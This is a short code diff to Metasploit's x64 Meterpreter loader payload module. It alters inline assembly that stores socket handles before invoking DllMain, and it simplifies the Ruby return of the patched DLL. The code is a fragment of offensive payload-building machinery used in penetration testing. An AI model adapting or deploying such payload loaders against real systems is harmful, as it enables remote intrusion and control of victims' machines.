@@ -52,8 +52,7 @@ module Payload::Windows::MeterpreterLoader_x64
         ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config)
           ; offset from ReflectiveLoader() to the end of the DLL
           add rbx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
-          mov [rbx], rdi        ; store the comms socket handle
-          mov [rbx+8], rsi      ; store the listen socket handle
+          mov dword ptr [rbx], edi        ; store the comms socket handle
           mov r8, rbx           ; r8 points to the extension list
           mov rbx, rax          ; save DllMain for another call
           push 4                ; push up 4, indicate that we have attached
@@ -85,7 +84,7 @@ module Payload::Windows::MeterpreterLoader_x64
     # patch the bootstrap code into the dll's DOS header...
     dll[ 0, bootstrap.length ] = bootstrap
 
-    return dll
+    dll
   end
 
 end
